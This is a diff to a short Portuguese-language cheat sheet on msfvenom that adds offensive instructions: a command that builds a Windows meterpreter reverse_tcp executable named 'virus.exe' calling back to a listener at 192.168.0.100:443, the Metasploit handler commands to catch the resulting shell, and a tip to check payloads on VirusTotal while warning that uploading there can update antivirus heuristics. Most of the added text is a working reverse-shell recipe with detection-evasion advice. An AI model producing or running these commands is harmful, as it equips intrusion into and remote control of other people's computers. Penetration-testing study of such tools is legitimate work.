@@ -1,6 +1,21 @@
 # MSFVENOM
 
 O msfvenom é utilizado para criação de exploit.
+Teste os seus payloads através do site https://www.virustotal.com.
+*Cuidado pois ao enviar para o vírus total, a heurística pode ser atualizada nos antivírus.*
+
+Verificar todos os payloads:
+msfvenom --list payloads
+
+Gerando payload para Windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=443 -f exe > virus.exe
+*Para receber a conexão do alvo será necessário que o msf esteja em execução:
+msfconsole
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LPORT 443
+msf exploit(handler) > set LHOST 192.168.0.100
+msf exploit(handler) > exploit*
 
 Criando um exploit para Windows:
 ```bash
